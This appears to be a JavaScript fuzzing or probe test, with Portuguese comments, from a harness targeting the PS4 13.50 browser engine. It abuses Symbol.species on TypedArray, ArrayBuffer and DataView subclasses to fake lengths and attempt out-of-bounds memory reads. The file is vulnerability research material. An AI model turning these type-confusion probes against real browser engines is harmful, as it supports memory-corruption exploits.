/**
 * TEST: Symbol.species Constructor Confusion
 * Explora Symbol.species para injetar construtor malicioso
 * PS4 13.50: Symbol=true, espécies nativas podem ser vulneráveis
 */

export const testSpeciesConstructorConfusion = {
    id: 'SPECIES_CONFUSION',
    name: 'Species Constructor Confusion',
    risk: 'CRITICAL',
    category: 'PROTO',
    description: 'Usa Symbol.species para confundir construtores de TypedArray',
    ps4Compatible: true,

    setup: function() {
        this.CHUNK_SIZE = 64;
        this.SPY_COUNT = 100;

        // TypedArray original
        this.originalArray = new Uint32Array(this.CHUNK_SIZE);
        for (let i = 0; i < this.originalArray.length; i++) {
            this.originalArray[i] = 0xDEAD0000 + i;
        }

        // Spy arrays
        this.spyArrays = [];
        for (let i = 0; i < this.SPY_COUNT; i++) {
            const arr = new Uint32Array(16);
            arr.fill(0xBBBB0000 + i);
            this.spyArrays.push(arr);
        }

        // Classe maliciosa
        this.MaliciousSpecies = class extends Uint32Array {
            static get [Symbol.species]() {
                return function(length) {
                    // Retorna array com length ENORME
                    const arr = new Uint32Array(16); // Buffer pequeno
                    Object.defineProperty(arr, 'length', {
                        value: 1000000,
                        writable: true
                    });
                    return arr;
                };
            }
        };

        this.maliciousInstance = null;
        this.confusionResults = [];
        this.oobDetected = false;
    },

    probe: [
        function(scenario) {
            return scenario.oobDetected ? 1 : 0;
        },
        function(scenario) {
            try { return scenario.spyArrays[0]?.[0]; } catch(e) { return -1; }
        },
        function(scenario) {
            return scenario.confusionResults.length;
        }
    ],

    trigger: function() {
        this.confusionResults = [];
        this.oobDetected = false;

        // ==========================================
        // ATAQUE 1: Uint32Array com species maliciosa
        // ==========================================
        try {
            this.maliciousInstance = new this.MaliciousSpecies(16);
            for (let i = 0; i < 16; i++) {
                this.maliciousInstance[i] = 0x13370000 + i;
            }

            // Tenta usar .map() - deve usar Symbol.species
            const mapped = this.maliciousInstance.map(x => x * 2);
            
            this.confusionResults.push({
                test: 'MAP_SPECIES',
                originalLength: this.maliciousInstance.length,
                mappedLength: mapped?.length,
                mappedByteLength: mapped?.buffer?.byteLength,
                success: true
            });

            // Verifica se mapped tem length corrompido
            if (mapped && mapped.length > 1000) {
                // Tenta ler OOB
                try {
                    const oobVal = mapped[20];
                    if (oobVal !== undefined) {
                        this.oobDetected = true;
                        this.confusionResults.push({
                            test: 'MAP_OOB_READ',
                            index: 20,
                            value: '0x' + oobVal.toString(16),
                            success: true
                        });
                    }
                } catch (e) {}
            }

            // Tenta .slice()
            const sliced = this.maliciousInstance.slice(0, 10);
            if (sliced && sliced.length > 1000) {
                this.confusionResults.push({
                    test: 'SLICE_SPECIES',
                    slicedLength: sliced.length,
                    success: true
                });
                
                try {
                    const oobVal = sliced[20];
                    if (oobVal !== undefined) {
                        this.oobDetected = true;
                        this.confusionResults.push({
                            test: 'SLICE_OOB',
                            value: '0x' + oobVal.toString(16)
                        });
                    }
                } catch (e) {}
            }

            // Tenta .filter()
            const filtered = this.maliciousInstance.filter(x => x > 0);
            if (filtered && filtered.length > 1000) {
                this.confusionResults.push({
                    test: 'FILTER_SPECIES',
                    filteredLength: filtered.length,
                    success: true
                });
            }

        } catch (e) {
            this.confusionResults.push({
                test: 'SPECIES_SETUP',
                error: e.message
            });
        }

        // ==========================================
        // ATAQUE 2: ArrayBuffer com species maliciosa
        // ==========================================
        try {
            class MaliciousBuffer extends ArrayBuffer {
                static get [Symbol.species]() {
                    return function(length) {
                        // Retorna buffer MINÚSCULO mas diz que é enorme
                        const buf = new ArrayBuffer(8);
                        Object.defineProperty(buf, 'byteLength', {
                            value: 1000000,
                            writable: true
                        });
                        return buf;
                    };
                }
            }

            const malBuf = new MaliciousBuffer(64);
            const view = new Uint32Array(malBuf);
            view.fill(0xCAFEBABE);

            // Tenta .slice() no buffer
            const slicedBuf = malBuf.slice(0);
            
            this.confusionResults.push({
                test: 'BUFFER_SPECIES',
                originalByteLength: malBuf.byteLength,
                slicedByteLength: slicedBuf?.byteLength,
                success: true
            });

            // Verifica byteLength real vs exposto
            if (slicedBuf && slicedBuf.byteLength !== 8) {
                this.confusionResults.push({
                    test: 'BUFFER_BYTELENGTH_CONFUSION',
                    expected: 8,
                    actual: slicedBuf.byteLength
                });
            }

        } catch (e) {
            this.confusionResults.push({
                test: 'BUFFER_SPECIES',
                error: e.message
            });
        }

        // ==========================================
        // ATAQUE 3: DataView com species
        // ==========================================
        try {
            class MaliciousDataView extends DataView {
                static get [Symbol.species]() {
                    return function(buf, offset, length) {
                        // Ignora o buffer original e cria um minúsculo
                        const fakeBuf = new ArrayBuffer(4);
                        const dv = new DataView(fakeBuf);
                        // Mas reporta byteLength enorme
                        Object.defineProperty(dv, 'byteLength', {
                            value: 1000000,
                            writable: true
                        });
                        return dv;
                    };
                }
            }

            const buf = new ArrayBuffer(64);
            const malDV = new MaliciousDataView(buf);
            
            this.confusionResults.push({
                test: 'DATAVIEW_SPECIES',
                dvByteLength: malDV.byteLength,
                bufferByteLength: malDV.buffer.byteLength,
                success: true
            });

        } catch (e) {
            this.confusionResults.push({
                test: 'DATAVIEW_SPECIES',
                error: e.message
            });
        }

        if (typeof gc === 'function') gc();
    },

    cleanup: function() {
        this.originalArray = null;
        this.spyArrays = null;
        this.maliciousInstance = null;
    },

    customValidator: function(baseResults, afterResults) {
        if (this.oobDetected) {
            const oobFinds = this.confusionResults.filter(r => r.test?.includes('OOB'));
            return {
                anomaly: true,
                reason: `💥💥💥 SPECIES OOB: Symbol.species permitiu OOB!\n${JSON.stringify(oobFinds, null, 2)}`
            };
        }

        // Verifica confusão de byteLength
        const byteConfusions = this.confusionResults.filter(r => 
            r.test === 'BUFFER_BYTELENGTH_CONFUSION' && r.actual !== r.expected
        );
        
        if (byteConfusions.length > 0) {
            return {
                anomaly: true,
                reason: `💥 BUFFER BYTELENGTH CONFUSION: byteLength exposto não corresponde ao real!\n${JSON.stringify(byteConfusions, null, 2)}`
            };
        }

        // Verifica se algum species retornou length > 1000
        const lengthConfusions = this.confusionResults.filter(r => 
            (r.mappedLength > 1000 || r.slicedLength > 1000 || r.filteredLength > 1000)
        );
        
        if (lengthConfusions.length > 0) {
            return {
                anomaly: true,
                reason: `🏆 SPECIES LENGTH CONFUSION: Construtor species retornou objeto com length anormal!\n${JSON.stringify(lengthConfusions, null, 2)}`
            };
        }

        return { anomaly: false, reason: '' };
    }
};
